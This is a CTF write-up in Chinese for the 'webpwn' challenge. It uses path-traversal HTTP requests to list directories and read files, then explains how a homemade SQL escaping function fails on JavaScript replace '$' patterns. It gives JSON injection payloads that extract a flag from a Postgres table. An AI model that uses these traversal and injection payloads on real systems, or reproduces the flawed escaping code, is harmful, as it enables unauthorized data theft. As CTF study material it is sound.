# webpwn

假pwn，真web

列目錄:

```
POST /cmd/ls HTTP/1.1
Host: webpwn.hackable.software:8080
Content-Length: 2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Connection: close

..
```

->

```
.ansible
.npm
babyheap.js
db.js
files
node_modules
package-lock.json
package.json
schema.sql
server.js
static
views
```


讀檔:

```
POST /cmd/cat HTTP/1.1
Host: webpwn.hackable.software:8080
Content-Length: 17
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Connection: close

../files/flag.txt
```

->

`No flag here, you need to look elsewhere ...`

仔細看一下schema.sql會看到:

```
--
-- Name: flag; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.flag (
    flag text
);


ALTER TABLE public.flag OWNER TO postgres;
```

所以目標是撈db中的flag

<br>

其中用來防SQL Injection的prepare function雖然看起來很完美，但其實是有問題的:

```
function prepare(query, params) {
        for (const key in params) {
                query = query.replaceAll(':' + key, sqlEscape(params[key]));
        }
        return query;
}
function sqlEscape(value) {
        return "'" + String(value).replace(/[^\x20-\x7e]|[']/g, '') + "'";
}
```

javascript replace string 中可以用 `$`

(ref: https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Global_Objects/String/replace#%E6%8C%87%E5%AE%9A%E4%B8%80%E5%80%8B%E5%AD%97%E4%B8%B2%E7%82%BA%E5%8F%83%E6%95%B8)

所以可以搞掉單引號去做注入:

```
{"key":"between $$$$a$$$$ and $$$$b$$$$)--","data":"$`"}
```

->

```
INSERT INTO notes (key, session_id, data) VALUES ('between $$a$$ and $$b$$)--', '01188712511121132590445932261811', 'INSERT INTO notes (key, session_id, data) VALUES ('between $$a$$ and $$b$$)--', '01188712511121132590445932261811', ')
```

成功跳脫單引號

後續就是插入一筆包含flag的資料:

```
{
    "key":"IS NULL),($$$$flag$$$$,$$$$01188712511121132590445932261811$$$$,(select flag from flag))--",
    "sid":"01188712511121132590445932261811"
    "data":"$`"
}
```

